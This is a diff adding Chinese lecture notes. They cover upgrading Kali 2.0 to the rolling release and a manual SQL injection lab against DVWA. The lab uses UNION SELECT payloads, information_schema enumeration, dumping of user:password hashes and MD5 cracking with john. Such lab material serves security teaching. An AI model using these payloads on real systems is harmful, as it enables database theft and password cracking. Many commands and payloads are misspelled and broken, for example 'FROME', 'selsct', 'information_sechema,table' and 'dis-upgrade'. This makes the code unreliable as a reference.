@@ -1,0 +1,122 @@
+课时88 KALI版本更新（第一个ROLLING RELEASE）和手动漏洞挖掘（SQL注入）
+
+KALI版本更新-----第一个ROLLING RELEASE
+Kali 2.0发布时声称将采用rolling release模式更新（但并未实施）
+Fixed-release
+    固定发布周期
+    使用软件稳定的主流版本
+        发布-----主流-----作废
+    更稳定，适合于企业生产环境
+Rolling release
+    使用于开发者和技术人员
+    连续升级新版本，追求在新功能出现后最快使用
+    正在成为流行
+
+KALI版本更新-----第一个ROLLING RELEASE
+Kali 2.0 rolling release
+    过去的5个月在少部分受邀人群中测试
+    采用debian testing库作为更新源
+软件包追踪
+    http://pkg.kali.org/
+WMware Tools vs Open-VM-Tools
+    apt-get install open-vm-tools-desktop fuse
+Gnome 3.18
+4.3内核
+
+KALI版本更新-----第一个ROLLING RELEASE
+kali 2.0现有版本升级
+cat << EOF > /etc/apt/sources.list
+deb http://http.kali.org/Kali kali-rolling main non-free contrib
+EOF
+
+apt-get update
+apt-get dis-upgrade # get a coffee, or 10.
+reboot
+
+kali sana库将于2016年4月15日停止更新
+目前存在一些小问题，相信很快会解决
+工具有所更新
+
+手工漏洞挖掘-----SQL注入
+服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器
+用户登录判断
+    SELECT*FROM users WHAERE usr='uname' AND password='pass'
+    SELECT*FROM users WHAERE usr='uname' AND password="OR"=''
+
+msfadmin@metasploitable:~# ifocnfig
+
+msfadmin@metasploitable:~# sudo dhclient eth0
+
+手动漏洞挖掘-----SQL注入
+基于报错的检测方法(low)
+    '"%()
+基于布尔的检测
+    1'and'1'='1    /    1'and'1
+    1'and'1'='2    /    1'and'0
+表列书/显示信息位于哪一列
+    'order by 9--+    #按查询序列号排序（注释符: -)
+        select*时表字段数=查询字段数
+联合查询
+    'union select 1,2-+
+    'union all select database(),2-+
+
+手动漏洞挖掘-----SQL注入
+union select database(),substring_index(USER(),"@",1)--
+DB用户: user()
+DB版本: version()
+全局函数:@@datadir、@@hostname、@@VERSION、@@version_compile_os
+当前库: database()
+ASCII转字符: char()
+连接字符串: CONCAT_WS(CHAR(32、58、32),user(),database(),version())
+计算哈希: md5()
+Mysql数据结构
+    information_schema
+
+手动漏洞挖掘-----SQL注入
+所有库所有表/统计每库中表的数量
+    union select table_name,table_schema from information_sechema,table--
+    UNION selsct table_schema.count(*) FROME information_Schema,table group by table_schema --
+Dvwa库中的表名
+    'union select table_name,table_schema from inforamtion_schema from information_schema,table where table_schema='dvwa'-+
+Users表中的所有列（user_id、fist_name、last_name、user、password、avatar)
+    'union select table_name,column_name from inforation_schema.columns where table_schema='dvwa' and table name='users'-+
+查询user、password列的内容
+    'union select user,password from dvwa,users-+
+    'union select user,password from users-+
+    'union select unll,concat(user,0x3a,password) from users-+
+
+root@kali:~# hash
+hash             hashcat-cliXOP   hashid
+hashcat          hashdeep         hash-identifier
+
+root@kali:~# hash-identifier
+
+手动漏洞挖掘-----SQL注入
+密码破解
+    username:passhash----->dvwa.txt
+    john --format=raw-MD5 dvwa.txt
+
+root@kali:~# ls
+
+root@kali:~# cat dvwa.txt
+
+root@kali:~# john --format=raw-MD5 dvwa.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
